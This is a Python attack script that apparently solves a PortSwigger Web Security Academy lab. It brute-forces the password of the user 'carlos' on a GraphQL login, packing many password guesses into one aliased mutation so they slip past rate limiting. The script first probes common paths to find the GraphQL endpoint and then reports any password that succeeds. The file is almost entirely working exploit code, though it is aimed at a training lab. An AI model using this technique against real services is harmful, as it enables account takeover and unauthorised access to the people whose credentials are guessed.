import requests

base_url = "https://0a8100ad042da9df80c7b7e0006d006b.web-security-academy.net"

common_endpoints = [
    "/graphql",
    "/api",
    "/api/graphql",
    "/api/graphql",
    "/graphql/api",
    "/graphql/v1",
    "/graphql/endpoint",
    "/graphql/graphql"
]

# 1. Find the GraphQL Endpoint

valid_endpoint = next(
    (
        base_url + path
        for path in common_endpoints
        if requests.post(
            base_url + path,
            json={"query": "{ __typename }"},
            headers={"Content-Type": "application/json"}
        ).status_code == 200
    ),
    None
)

if not valid_endpoint:
    print("No valid GraphQL endpoint found.")
    exit()

print(f"Valid endpoint found: {valid_endpoint}")

# 2. Read password list and generate alias requests

with open('pass_list.txt', 'r') as file:
    passwords = [line.strip() for line in file]

graphql_query = "mutation {\n"
for index, password in enumerate(passwords):
    graphql_query += f"bruteforce{index}:login(input:{{password: \"{password}\", username: \"carlos\"}}) {{ success }}\n"
graphql_query += "}"


# 3. Fire requests for all passwords and check if any password succeeds the login

response = requests.post(
    valid_endpoint,
    json={"query": graphql_query},
    headers={"Content-Type": "application/json"}
)

if response.status_code == 200:
    data = response.json()
    for key, result in data.get("data", {}).items():
        if result.get("success"):
            print(f"Password found: {passwords[int(key.replace('bruteforce', ''))]}")
            exit()
else:
    print(f"Error: {response.status_code} - {response.text}")

print("No valid password found.")
